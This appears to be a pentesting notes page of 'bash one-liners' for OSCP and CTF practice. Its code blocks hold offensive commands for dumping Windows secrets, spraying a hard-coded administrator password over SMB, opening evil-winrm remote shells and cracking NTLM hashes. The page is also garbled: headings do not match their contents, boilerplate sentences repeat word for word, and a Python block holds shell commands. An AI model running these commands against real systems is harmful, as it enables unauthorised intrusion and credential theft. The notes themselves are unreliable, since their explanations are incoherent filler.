---
TitleSEO: "Bash One-Liners for Security Testing | ZureFX"
TitlePost: "Bash One-Liners for Security Testing"
Author: "ZureFX"
Description: "Personal notes on Bash One-Liners for Security Testing. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, oscp, enumeration, networking, linux, lateral movement"
URL: "https://zurefx.github.io/notes/note-bash-one-liners-for-security-testing-189.html"
URL_IMAGES: ""
Date: "2024-01-25"
Tags: "Persistence, OSCP, Enumeration, Networking, Linux, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-bash-one-liners-for-security-testing-189"
Permalink: "/notes/note-bash-one-liners-for-security-testing-189.html"
BtnLabel: "Read Notes"
Pick: 0
---
## FTP

### Docker Escape

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.100.33
crackmapexec smb 10.74.226.10 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
evil-winrm -i 10.28.77.34 -u administrator -p 'P@ssw0rd!'
```

## DNS

### sqlmap

```python
crackmapexec smb 10.118.126.191 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.63.18.70 -u administrator -p 'P@ssw0rd!' --shares
```

- `smbclient`
- `gobuster`
- `CORS Misconfiguration`
- `lookupsid`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.80.3/FUZZ
evil-winrm -i 10.39.16.130 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8888,995,5985 10.55.46.65 -oN scan.txt
feroxbuster -h
```

## Flask

### PostgreSQL

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

- `socat`
- `LAPS Abuse`
- `Remote Code Execution`
- `nmap`

> **Note:** NTLM Relay was identified as the primary attack vector in this scenario.
